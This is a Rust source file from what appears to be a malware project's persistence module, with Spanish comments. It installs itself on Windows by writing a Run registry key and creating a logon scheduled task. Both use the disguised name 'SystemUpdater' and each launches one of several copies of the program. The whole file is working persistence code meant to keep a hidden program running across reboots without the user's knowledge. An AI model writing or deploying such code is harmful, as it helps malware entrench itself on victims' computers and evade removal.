// persistence/windows.rs
use std::path::PathBuf;
use winreg::RegKey;
use winreg::enums::*;

pub fn install_persistence(copias: &[PathBuf]) -> Result<(), Box<dyn std::error::Error>> {
    println!("🪟 Instalando persistencia en Windows...");

    // 1. Registrar la primera copia en Registry Run
    if let Some(primary) = copias.first() {
        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
        let (key, _) = hkcu.create_subkey(r"Software\Microsoft\Windows\CurrentVersion\Run")?;
        key.set_value("SystemUpdater", &primary.to_str().unwrap())?;
        println!("✅ Registry Run: {}", primary.display());
    }

    // 2. Crear tarea programada como respaldo (ejecuta la segunda copia)
    if let Some(secondary) = copias.get(1) {
        use std::process::Command;
        let _ = Command::new("schtasks")
            .args(&[
                "/create",
                "/tn", "SystemUpdater",
                "/tr", secondary.to_str().unwrap(),
                "/sc", "onlogon",
                "/delay", "0001:00",
                "/f"
            ])
            .spawn();
        println!("✅ Tarea programada: {}", secondary.display());
    }

    Ok(())
}
